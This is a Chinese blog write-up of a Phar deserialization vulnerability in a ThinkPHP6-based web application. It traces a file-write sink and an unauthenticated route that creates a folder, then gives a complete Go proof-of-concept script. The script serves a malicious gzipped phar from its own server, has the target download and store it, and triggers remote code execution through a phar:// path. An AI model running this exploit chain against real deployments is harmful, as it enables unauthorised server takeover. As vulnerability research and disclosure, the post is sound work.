---
author: Noel
pubDatetime: 2024-11-02T21:54:11.000+08:00
modDatetime: 2024-11-02T21:54:11.000+08:00
title: Phar序列化漏洞挖掘
featured: false
draft: false
tags:
  - 漏洞挖掘
  - 网络安全
description: |
    看到先知社区以及发了相关文章了https://xz.aliyun.com/t/15778，那就把当年挖洞的过程也分享一下。
---

看到先知社区已经发了相关文章了[https://xz.aliyun.com/t/15778](https://xz.aliyun.com/t/15778)，那就把当年挖洞的过程也分享一下。具体版本忘记了。。。

## Table of Content

## 正文

由于此项目使用的是ThinPHP6的框架，由于TP6 是存在反序列化漏洞的，因此我们只需要去找到一个反序列化入口即可实现反序列化攻击.

在2018年的 BlackHat 大会上的 Sam Thomas 分享了[一个议题](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf) ，指出`Phar 伪协议`配合部分文件函数能够在不依赖`unserialize()`函数的情况下直接进行反序列化.也正式从此时起,各种框架都开始爆出反序列化漏洞.

本篇文章也正是以`Phar 反序列化`知识点为主,通过去寻找可控文件函数,去挖掘反序列化漏洞.

### 查找文件操作可控点

由于大部分的文件操作函数都能够触发`phar` 伪协议, 因此我们就去代码中去寻找文件函数.

```
readfile|file_get_contents|file_exists
...
```

先去找找最常见的文件操作函数.....

最终在`app/common.php`中的`第526行的 put_image`找到了一处.

![image-20221209232238841](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209232238841.png)

查看下这个函数的调用,跳转到`app/api/controller/v1/PublicController.php`,看文件名就感觉这个地方有戏.

![image-20221209232549734](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209232549734.png)

分析下此处的代码:

接受post传过来的两个参数`image`和`code`, 先将`$codeUrl`通过 `image_to_base64`函数, 如果返回结果为假, 则调用`put_image()`函数.

我们跟进下 `image_to_base64`这个函数.

其内容如下:

```php
function image_to_base64($avatar = '', $timeout = 9)
    {
        $avatar = str_replace('https', 'http', $avatar);
        try {
            $url = parse_url($avatar);
            $url = $url['host'];
            $header = [
                'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0',
                'Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                'Accept-Encoding: gzip, deflate, br',
                'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Host:' . $url
            ];
            $dir = pathinfo($url);
            $host = $dir['dirname'];
            $refer = $host . '/';
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_REFERER, $refer);
            curl_setopt($curl, CURLOPT_URL, $avatar);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_ENCODING, 'gzip');
            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
            $data = curl_exec($curl);
            $code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            curl_close($curl);
            if ($code == 200) {
                return "data:image/jpeg;base64," . base64_encode($data);
            } else {
                return false;
            }
        } catch (\Exception $e) {
            return false;
        }
    }
```

![image-20221209233117396](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209233117396.png)

这段代码也不是很难,就是封装了一个`curl` 然后去模拟一次请求, 如果请求状态码为`200`,就将请求到的内容进行base64加密,如果请求状态码不是`200`,就返回`false`.

之前已经分析过了只有这个函数返回为假才能够进入`put_image` 函数,因此就需要让此处的相应状态码不等于200.这个好解决,自己写个服务端就行了(代码在后面).    

回到 `put_image`函数,可以看到其还对文件拓展名进行了判断,所以此处还需要满足请求路径的拓展名在白名单内.

现在文件读取有了, 接下来的就需要去找思考如何将文件上传上去.

同样可以在`put_image`后看到`fopen`和`fwrite` 的操作.那么这个函数是既可以写文件也可以读文件. 不过在写的时候, 发现默认不存在 `qrcode`文件夹.那么我们还需要通过一定手段去创建一个文件夹.

### 查找文件上传接口

生成`qrcode`文件夹得接口：

```
/api/pc/get_pay_vip_code
```

寻找过程及其思路:

由于需要创建文件夹 `uploads/qrcode` 文件夹, 先全局搜索一下这个关键字:

![image-20221209003613455](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209003613455.png)

可以看到一共只搜索到两处, 其中第二处是我们遇到的地方,来查看第二处, 是一个数组  `cache_dir=>uploads/qrcode`, 很自然就想到去搜搜索`cache_dir`.

全局搜索 `cache_dir`, 先快速过一遍有没有一眼就能利用的点.然后发现了这么一个函数,如图:

![image-20221209223037570](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209223037570.png)

```php
class QRcode extends \dh2y\qrcode\QRcode
{
    public function setCacheDir(string $cache_dir)
    {
        echo "you are in setCacheDir function\n"; // 这句是我后面自己加的, 目的是为了判断此函数是否触发.
        $this->cache_dir = $cache_dir;
        if (!file_exists($this->cache_dir)) {
            mkdir($this->cache_dir, 0775, true);
        }
        return $this;
    }

}
```

可以看到这里存在一个目录创建, 如果我们传入的`uploads/qrcode`,那么此时也就能这个`qrcode` 目录了.

`ctrl + 左键`查看下这个函数的调用,运气很好,只有一处,位于`services/UtilService.php`:

![image-20221209223531466](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209223531466.png)

回溯下 `$outfiles`到 `270行`,猜测这个函数是去调用配置文件, 直接去反反`config` 目录, 找到一个 `qrcode.php`, 感觉很眼熟,一看简直惊喜!

![image-20221209223815175](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209223815175.png)

那此处`$outfile`的值应该就是 `uploads/qrcode`了.

ok那接下来的重点在于如何调用 `setCacheDir($outfiles)`所在的函数`getQRCodePath`了, 可以看到调用的地方还是比较多,那么我们怎么快速去找到利用点呢?

![image-20221209224742781](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209224742781.png)

1. 看注释, 注释能够简化我们理解函数的功能
2. 尽量往公开的未授权接口靠近.

第一点很好理解,这里就不再赘述,接下来我主要描述第二点:

关于未授权接口,不同的项目有不同的表现形式,以我审计的这个项目为例:

![image-20221209225336704](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209225336704.png)

可以看到在这个项目的 `route`文件夹下已经规定了很多路由,很幸运的是,  作者对接口进行了注释分类, 而每个未授权的接口又存在对应的控制器,

![image-20221209225517198](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209225517198.png)

因此我们此时的目的就很简单了, 让回溯的函数最后出现在这些控制器文件中,然后去看对应控制函数的调用是否是未授权调用.

最后我找到一个调用链:

![image-20221209231605621](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209231605621.png)

于是访问路由, 生成`qrcode` 文件夹.

![image-20221209231817345](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20221209231817345.png)

### Poc

```go
package main

import (
    "errors"
    "fmt"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "strings"
    "time"

    "github.com/imroc/req/v3"
)

var (
    count     uint8  = 0
    target    string = "http://cremb"
    startTime int64
    router    string
    serverUrl string
)

func index(w http.ResponseWriter, req *http.Request) {
    count++
    fmt.Println("And count is: ", count)
    w.WriteHeader(201)
    w.Header().Set("Content-Type", "application/octet-stream")
    content, err := os.ReadFile("exp/exp.phar.gz")
    if err != nil {
        fmt.Println("Read file error", err)
    }
    w.Write(content)
}

func exp() {
    err := stepOne()
    if err != nil {
        fmt.Println("[--] ", err)
        return
    }
    err = stepTwo()
    if err != nil {
        fmt.Println("[--] ", err)
        return
    }
    err = StepThree()
    if err != nil {
        fmt.Println("[--] ", err)
        return
    }
}

// Generate Qrcode dictionary
func stepOne() error {
    fmt.Println("[**] Step one: generate qrcode dictionary.....")
    genQRUrl := fmt.Sprintf("%s/api/pc/get_pay_vip_code", target)
    client := req.NewClient()
    resp := client.NewRequest().MustGet(genQRUrl)
    if !strings.Contains(resp.String(), "{\"status\":200") {
        return errors.New("Step one error")
    }
    fmt.Println("[++] Step one successfully .....")
    return nil
}

// Write exp file into victim
func stepTwo() error {
    fmt.Println("[**] Step two: Writing exp file.....")
    downFileUrl := fmt.Sprintf("%s/api/image_base64", target)
    client := req.C()
    resp := client.R().
        SetFormData(map[string]string{
            "code": serverUrl,
        }).MustPost(downFileUrl)
    startTime = time.Now().Unix()
    fmt.Println("step two: ", resp.String())
    if strings.Contains(resp.String(), `{"code":"data:image`) && count > 0 {
        fmt.Println("[++] Step two successfully!")
        return nil
    }
    return errors.New("Step two error")
}

// Phar to trigger ThinPHP6 unserialize attack
func StepThree() error {
    fmt.Println("[**] Step three: phar unserialize.....")
    rceUrl := fmt.Sprintf("%s/api/image_base64", target)
    client := req.C()
    isShell := false
    for i := 1; i < 6; i++ {
        fmt.Println("Now  timestamp is ", startTime)
        resp := client.R().
            SetFormData(map[string]string{
                "image": fmt.Sprintf("phar://uploads/qrcode/%d.png/test.png", startTime),
            }).MustPost(rceUrl)
        fmt.Println(resp.String())
        if strings.Contains(resp.String(), `"image":"data:image`) {
            isShell = true
            break
        }
        startTime++
    }

    if isShell {
        fmt.Println("[++] Step three succrssfully....")
        return nil
    }
    return errors.New("Step three error")
}

// Generate exp file
func genExpFile() error {
    fmt.Println("[**]Genrate exp file ....")
    pharFile := exec.Command("php", "exp.php")
    pharFile.Dir = "exp/"
    err := pharFile.Run()
    if err != nil {
        return errors.New("Generate exp file failed...1")
    }

    gzPharFile := exec.Command("gzip", "exp.phar")
    gzPharFile.Dir = "exp/"
    err = gzPharFile.Run()
    if err != nil {
        return errors.New("Generate exp file failed...2")
    }

    fmt.Println("[++]Genrate exp file successfully")
    return nil
}

func main() {
    rand.Seed(time.Now().Unix())
    router = fmt.Sprintf("%d.png", rand.Intn(10000))
    serverUrl = "http://127.0.0.1:8882/" + router
    go func() {
        err := genExpFile()
        if err != nil {
            fmt.Println("[--] ", err)
        }
        timer := time.After(time.Second)
        select {
        case <-timer:
            exp()
        }
    }()
    http.HandleFunc("/"+router, index)
    http.ListenAndServe(":8882", nil)
}
```

> 有个需要注意的地方,  如果直接生成phar文件让受害者读取的话会出现错误，所以这里我使用了gzip进行压缩之后再读取就不会出现这个问题.
